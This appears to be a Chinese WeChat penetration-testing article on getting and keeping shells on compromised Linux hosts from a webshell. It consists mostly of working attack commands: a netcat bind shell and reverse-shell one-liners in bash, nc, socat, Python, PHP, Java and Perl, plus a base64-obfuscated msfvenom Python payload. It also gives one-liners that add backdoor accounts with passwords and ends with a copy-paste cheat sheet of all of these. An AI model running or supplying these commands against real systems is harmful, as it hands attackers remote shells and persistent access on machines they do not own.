\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzUyMTA0MjQ4NA==&mid=2247494707&idx=3&sn=513c197f601ff51a60bd90c5b249f28e&chksm=f9e38368ce940a7e6cc665df5896f97d382832ee167879e81c40667dd4ab417c21d3fb13960d&mpshare=1&scene=1&srcid=1016V3pyEgSjwvT9w6aYprBA&sharer\_sharetime=1602809003798&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=1fd465a69b407b1c2d81df2ead818242bcd4e92dbec4c82ef4083f07be4f9c3010c1f9f581a048f5fde05c96ce5c506f1a5d7e7ae3da8776718bc0a02c6490f827745a378dfe93d5098d1cb03c2bec1d86a4fa2c74a7af882851bc5557e524d1668b9d31d9d260af027e65850895b53d91f3a89bcf968c4ef9e5f8db7db2ea65&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AYIbFQ2NGtg4JmE0l18KVo4%3D&pass\_ticket=fNc1mNErgeHhn4jm0DcjBlD5hkXepEyD08VA%2B16wYw5QmvtETgayFa%2BrZuz3ot9i&wx\_header=0)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/GfOvuXUmaIichKN4fuyBV856xHdsnuRTeChfYItiaiaP6C5QQibXh56dmwWiaMFia2yE01nib45cPuiaib6kMd5OT95aeeA/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1 "15254461546.gif")  

**简介**

  

****我们在渗透测试的过程中经常会遇到linux主机环境，而在获取linux主机shell是我们经常需要做的是工作内容之一，其中经常会遇到以下几个场景。****  

**一、场景一**

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d2DRUkLxBZfH77TdmX5a7aUQsgBeagMusYK63Do49t5eVY2qiaD0F7oWNYwNKjVgf7icJJEcC7vnww/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "t01a5687bc7bdb3ab27.png")

我们已经拿下主机的一个webshell,我们想获取一个可以直接操作主机的虚拟终端，此时我们首先想到的是开启一个shell监听，这种场景比较简单，我们直接使用使用nc即可开启，如果没有nc我们也可以很轻松的直接下载安装一个，具体开启监听的命令如下。

**1.1 安装netcat**

这里需要注意一点默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e这里都被阉割了，所以我们需要手动下载二进制安装包，自己动手丰衣足食了，具体过程如下。

原生版本netcat链接：

```
`https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz` `# 第一步：下载二进制netc安装包``root@home-pc# wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz` `# 第二步：解压安装包``root@home-pc# tar -xvzf netcat-0.7.1.tar.gz``# 第三步：编译安装``root@home-pc# ./configure``root@home-pc# make``root@home-pc# make install``root@home-pc# make clean``# 具体编译安装过程可以直接参见INSTALL安装说明文件内容...``# 第四步：在当前目录下运行nc帮助``root@home-pc:/tmp/netcat-0.7.1# nc -h``GNU netcat 0.7.1, a rewrite of the famous networking tool.``Basic usages:``connect to somewhere:  nc [options] hostname port [port] ...``listen for inbound:    nc -l -p port [options] [hostname] [port] ...``tunnel to somewhere:   nc -L hostname:port -p port [options]``Mandatory arguments to long options are mandatory for short options too.``Options:` `-c, --close                close connection on EOF from stdin` `-e, --exec=PROGRAM         program to exec after connect` `-g, --gateway=LIST         source-routing hop point[s], up to 8` `-G, --pointer=NUM          source-routing pointer: 4, 8, 12, ...` `-h, --help                 display this help and exit` `-i, --interval=SECS        delay interval for lines sent, ports scanned` `-l, --listen               listen mode, for inbound connects` `-L, --tunnel=ADDRESS:PORT  forward local port to remote address` `-n, --dont-resolve         numeric-only IP addresses, no DNS` `-o, --output=FILE          output hexdump traffic to FILE (implies -x)` `-p, --local-port=NUM       local port number` `-r, --randomize            randomize local and remote ports` `-s, --source=ADDRESS       local source address (ip or hostname)` `-t, --tcp                  TCP mode (default)` `-T, --telnet               answer using TELNET negotiation` `-u, --udp                  UDP mode` `-v, --verbose              verbose (use twice to be more verbose)` `-V, --version              output version information and exit` `-x, --hexdump              hexdump incoming and outgoing traffic` `-w, --wait=SECS            timeout for connects and final net reads` `-z, --zero                 zero-I/O mode (used for scanning)``Remote port number can also be specified as range.  Example: '1-1024'`
```

```
至此我们已经安装完成原生版本的 netcat工具，有了netcat -e参数，我们就可以将本地bash完整发布到外网了。  

```

**1.2 开启本地监听**

```
`# 开启本地8080端口监听，并将本地的bash发布出去。``root# nc -lvvp 8080 -t -e /bin/bash`
```

**1.3 直接连接目标主机**

```
`root@kali:~# nc 192.168.31.41 8080``whoami``root``w` `22:57:36 up  1:24,  0 users,  load average: 0.52, 0.58, 0.59``USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHA`
```

```
  

```

**二、场景二**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t0130dbc4bb61a6f6bd.png")

目标主机为一个内网主机，并没有公网IP地址，我们无法从外网发起对目标主机的远程连接，此时我们使用的方法是使用获取的webshell主动发起一个反弹的shell到外网，然后获取一个目标主机的shell终端控制环境，而有关shell反弹的方法有很多这里简单介绍几种比较常见的方法。

**2.1 bash 直接反弹**

bash一句话shell反弹：个人感觉最好用的用的方法就是使用的方法就是使用bash结合重定向方法的一句话，具体命令如下。

（1） bash反弹一句话

```
root# bash -i >& /dev/tcp/192.168.31.41/8080 0>&1
```

（2）bash一句话命令详解

以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t013e425e5510c369cc.png")

其实以上bash反弹一句完整的解读过程就是：

bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。

**2.2 netcat 工具反弹**

Netcat 一句话反弹：Netcat反弹也是非常常用的方法，只是这个方法需要我们手动去安装一个NC环境，前面已经介绍默认的linux发型版现在自带的NC都是被阉割过来，无法反弹一个bash给远端，所以相对上面的bash一句话反弹显得就繁琐很多，同时通过实际测试发现NC反弹的shell交互性也差很多，后面会具体说道，这里就不多说了。

**（1）开启外网主机监听**

```
`root@kali:~# nc -lvvp 8080``listening on [any] 8080 ...`
```

**（2） netcat安装**

有关netcat的原生二进制安装包的编译安装内容请参考场景一中的具体说明；

**（3）netcat 反弹一句话**

```
`~ # nc 192.168.31.174 8080 -t -e /bin/bash``# 命令详解：通过webshell我们可以使用nc命令直接建立一个tcp 8080 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机（192.168.31.174）。`
```

```
**（4）shell反弹成功**  

```

此时我们再回到外网主机，我们会发现tcp 8080监听已经接收到远端主机发起的连接，并成功获取shell虚拟终端控制环境。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t01ac77c1444b613131.png")

**2.3 socat 反弹一句话**

Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情 ，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。

有关socat二进制可执行文件，大家可以到这个链接下载：https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86\_64/socat

**（1） 攻击机上开启监听**

```
# socat TCP-LISTEN:12345 -
```

**![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t01fb55246360bb938c.png")**

**（2） 靶机上运行socat反弹shell**

```
# /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.31.174：12345
```

```
![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t010e9ea71484391967.png")  

```

**（3） shell 反弹成功**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t01a90860984bbac549.png")

**2.4 其他脚本一句话shell反弹**

以下脚本反弹一句话的使用方法都是一样的，只要在攻击机在本地开启 TCP 8080监听，然后在远端靶机上运行以下任意一种脚本语句，即可把靶机的bash反弹给攻击主机的8080端口（当然前提条件是目标主机上要有响应的脚本解析环境支持，才可以使用，相信这点大家肯定都是明白的）。

**2.4.1 python脚本反弹**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
**2.4.2 php 脚本反弹**  

```

```
php -r '$sock=fsockopen("192.168.31.41",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```
**2.4.3 Java 脚本反弹**  

```

```
`r = Runtime.getRuntime()``p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.31.41/8080;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])``p.waitFor()`
```

**2.4.4 perl 脚本反弹**

```
perl -e 'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
**2.5 msfvenom 获取反弹一句话**  

```

学习过程中发现其实强大的MSF框架也为我们提供了生成一句话反弹shell的工具，即msfvenom。绝对的实用，当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit,随时我们都可以使用msfvenom -l 来查询生成我们所需要的各类命令行一句话，具体使用方法为各位看官老爷们收集如下。

**2.5.1 查询 payload 具体路径**

我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/unix/reverse），找出我们需要的各类反弹一句话payload的路径信息。

```
# msfvenom -l payloads 'cmd/unix/reverse'
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t014f984e560232d602.png")

查看以上截图，我们可以看到msfvenom支持生成反弹shell一句话的类型非常丰富，这里几乎是应有尽有，大家可以依据渗透测试对象自行选择使用。

**2.5.2 生成我们我们需要的命令行一句话**

依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可。

**bash 反弹一句话生成**

```
# root@kali:~# msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R
```

```
**阉割版nc反弹一句话生成**  

```

```
# root@kali:~# msfvenom -p cmd/unix/reverse_netcat lhost=1.1.1.1 lport=12345 R
```

```
**![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t01bc2936c36f38c0e9.png")**  

```

**2.5.3 msfvenom 使用实例**

（1） 开启攻击机监听

在攻击机上开启本地 TCP 12345 端口监听，准备监听机上的会话反弹，查看如下截图可以看到本地TCP 12345 端口监听已经开启。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t01ac576b7619c4c454.bmp")

（2） 获取python一句话

我们此时可以借助于MSF框架平台的msfvenom 工具自动生成一个python 反弹一句话，具体操作请参加如下截图。（当然这里的前提条件是靶机上安装有python环境，现在默认一般的linux发行版默认都安装有python环境。）

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t01f8abd9cc27aac7ca.png")

  

（3） 靶机上运行python一句话

```
python -c "exec('aW1wb3J0IHNvY2tldCAgICAgICAgLCBzdWJwcm9jZXNzICAgICAgICAsIG9zICAgICAgICA7ICBob3N0PSIxOTIuMTY4LjMxLjIwMCIgICAgICAgIDsgIHBvcnQ9MTIzNDUgICAgICAgIDsgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAgLCBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICA7ICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgcG9ydCkpICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgMCkgICAgICAgIDsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAxKSAgICAgICAgOyAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsIDIpICAgICAgICA7ICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))"
```

```
直接将上面msfvenon 生成的 python 一句话复制到靶机webshell上运行即可，我这里为演示方便，直接贴了一张使用kali做为靶机运行的截图。  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t0179af6bcb10d0e584.bmp")

（4） 攻击监听接受反弹情况

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t017ffd2dfe6e119742.bmp")

  

**三、场景三**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t01706b47c2a010d896.png")

场景三其实应该是在使用shell环境获取的过程中遇到的问题孕育出来的，大家如果经常使用前各种方法进行虚拟终端环境获取的话，会发现存在一个问题，就是我们即使获取了目标虚拟终端控制权限，但是往往会发现交互性非常的差，就是发现这个虚拟回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。

**问题1：** 获取的虚拟终端没有交互性，我们想给添加的账号设置密码，无法完成。 

**问题2**：标准的错误输出无法显示，无法正常使用vim等文本编辑器等； 

**问题3：** 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。

针对以上问题个人学习和总结了以下的应对方法，请大家参考交流。

**3.1 一句话添加账号**

你不是不给我提供交互的界面吗，那我就是使用脚本式的方法，使用一句话完成账号密码的添加，有关一句话账号密码的添加，笔者收集了以下几种方式。

**3.1.1 chpasswd 方法**

**（1）执行语句**

```
useradd newuser;echo "newuser:password"|chpasswd
```

**（2）操作实例**

```
`root@ifly-21171:~# useradd guest;echo 'guest:123456'|chpasswd``root@ifly-21171:~# vim /etc/shadow``sshd:*:17255:0:99999:7:::``pollinate:*:17255:0:99999:7:::``postgres:*:17390:0:99999:7:::``guest:$6$H0a/Nx.w$c2549uqXOULY4KvfCK6pTJQahhW7fuYYyHlo8HpnBxnUMtbXEbhgvFywwyPo5UsCbSUAMVvW9a7PsJB12TXPn.:17425:0:99999:7:::`
```

```
**3.1.2 useradd -p 方法**  

```

**（1） 执行语句**

```
useradd -p encrypted_password newuser
```

**（2） 操作实例**

```
``root@ifly-21171:~# useradd -p `openssl passwd 123456` guest```root@ifly-21171:~# vim /etc/shadow``sshd:*:17255:0:99999:7:::``pollinate:*:17255:0:99999:7:::``postgres:*:17390:0:99999:7:::``guest:h8S5msqJLVTfo:17425:0:99999:7:::`
```

```
  

```

**（3） 相同方法其他实现**

 相同方法不同实现一

```
`root@ifly-21171:~# useradd -p "$(openssl passwd 123456)" guest``root@ifly-21171:~#`
```

```
  

```

相同方法不同实现二  

```
``user_password="`openssl passwd 123456`"```useradd -p "$user_password" guest`
```

```
  

```

**3.1.3 echo -e 方法**

（1）执行语句

```
`useradd newuwer;echo -e "123456n123456n" |passwd newuser`
```

```
（2） 操作实例  

```

```
`root@ifly-21171:~# useradd test;echo -e "123456n123456n" |passwd test``Enter new UNIX password: Retype new UNIX password: passwd: password updated successfully``root@ifly-21171:~# vim /etc/shadow``sshd:*:17255:0:99999:7:::``pollinate:*:17255:0:99999:7:::``postgres:*:17390:0:99999:7:::``guest:h/UnnFIjqKogw:17425:0:99999:7:::``test:$6$rEjvwAb2$nJuZ1MDt0iKbW9nigp8g54ageiKBDuoLObLd1kWUC2FmLS0xCFFZmU4dzRtX/i2Ypm9uY6oKrSa9gzQ6qykzW1:17425:0:99999:7:::`
```

```
**3.2 python 标准虚拟终端获取**  

```

我们通过各种方式获取的shell经常不稳定或者没有交互界面的原因，往往都是因为我们获取的shell不是标准的虚拟终端，此时我们其实可以借助于python来获取一个标准的虚拟终端环境。python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。

**3.2.1 python 一句话获取标准shell**

使用python 一句话获取标准shell的具体命令如下：

```
# python -c "import pty;pty.spawn('/bin/bash')"
```

命令详解：python 默认就包含有一个pty的标准库。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t014c435297575be7d6.png")

**3.2.2 实例演示**

具体（1）开启监听；（2）反弹shell；（3）会话建立的过程这里不在重复演示了，这里直接贴出笔者获取到反弹shell后的问题后，如何通过python获取标准shell的过程截图展现如下。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "t01aa7f10971118a086.bmp")

虽然到目前为止写的虚拟终端并没有原生终端那样好,但是花点时间去折腾然后不断的去完善.相信会做的更好. 大家可能在渗透测试的时候会发现有些时候系统的命令终端是不允许直接访问的,那么这个时候用Python虚拟化一个终端相信会让你眼前一亮.

  

**四、写在最后**

最后将上面学习的内容做一下小结，以方便日后可以直接复制粘贴使用，笔者贴心不，你就说贴心补贴（ou tu bu zhi …）

**4.1 nc开启本地监听发布bash服务**

```
# nc -lvvp 12345 -t -e /bin/bash
```

**4.2 常用反弹shell一句话**

（1） bash 反弹一句话

```
# bash -i >& /dev/tcp/192.168.1.123/12345 0>&1
```

（2） nc 反弹一句话

```
# nc 192.168.1.123 12345 -t -e /bin/bash
```

（3） socat 反弹一句话

```
`# wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat      # 第一步：下载socat到/tmp目录下``# chmod 755 /tmp/socat          # 第二步：给socaat授予可以执行权限``# /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.31.41：12345        # 第三步：反弹shell到目标主机的12345端口`
```

```
**4.3 利用msfvenom获取反弹一句话**  

```

（1） 查询 reverse payload 反弹路径

```
# msfvenom -l payloads 'cmd/unix/reverse'
```

（2） 生成相关反弹一句话

```
`# msfvenom -p cmd/unix/reverse_xxxx lhost=1.1.1.1 lport=12345 R`
```

```
剩下的就是将生成的payload 反弹一句话直接复制到靶机上直接运行即反弹一个shell出来。  

```

**4.4 使用python获取标准shell**

直接在获取的废标准shell上直接运行一下python 一句话即可获取一个标准的shell。

```
# python -c "import pty;pty.spawn('/bin/bash')"
```

**4.5 linux 一句话添加账户**

（1）chpasswd 方法

```
# useradd guest;echo 'guest:123456'|chpasswd
```

（2）useradd -p 方法

```
# useradd -p `openssl passwd 123456` guest
```

（3）echo -e 方法

```
# useradd test;echo -e "123456n123456n" |passwd test
```

  

**学习参考**

```
`https://github.com/smartFlash/pySecurity/blob/master/zh-cn/0x11.md` `http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet` `http://www.freebuf.com/news/142195.html` `http://brieflyx.me/2015/linux-tools/socat-introduction/

`
```

  

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

学习渗透技术的书籍推荐：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

[APK签名校验绕过](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493664&idx=2&sn=cbca3b33aedc8468f60eda64fb25734b&chksm=f9e3877bce940e6da68def0070d283d1ce6c0d987c02f9f9bac23fbfb589c6ab065efaa1c9c5&scene=21#wechat_redirect)  

[ctf系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493664&idx=1&sn=40df204276e9d77f5447a0e2502aebe3&chksm=f9e3877bce940e6d0e26688a59672706f324dedf0834fb43c76cffca063f5131f87716987260&scene=21#wechat_redirect)

[日志安全系列-安全日志](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494122&idx=1&sn=984043006a1f65484f274eed11d8968e&chksm=f9e386b1ce940fa79b578c32ebf02e69558bcb932d4dc39c81f4cf6399617a95fc1ccf52263c&scene=21#wechat_redirect)

[【干货】流量分析系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494242&idx=1&sn=7f102d4db8cb4dddb5672713803dc000&chksm=f9e38539ce940c2f488637f312fb56fd2d13a3dd57a3a938cd6d6a68ebaf8806b37acd1ce5d0&scene=21#wechat_redirect)

[【干货】超全的 渗透测试系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494408&idx=1&sn=75b61410ecc5103edc0b0b887fd131a4&chksm=f9e38453ce940d450dc10b69c86442c01a4cd0210ba49f14468b3d4bcb9d634777854374457c&scene=21#wechat_redirect)

[【干货】持续性更新-内网渗透测试系列文章](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494623&idx=1&sn=f52145509aa1a6d941c5d9c42d88328c&chksm=f9e38484ce940d920d8a6b24d543da7dd405d75291b574bf34ca43091827262804bbef564603&scene=21#wechat_redirect)

* * *

****扫描关注LemonSec****  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)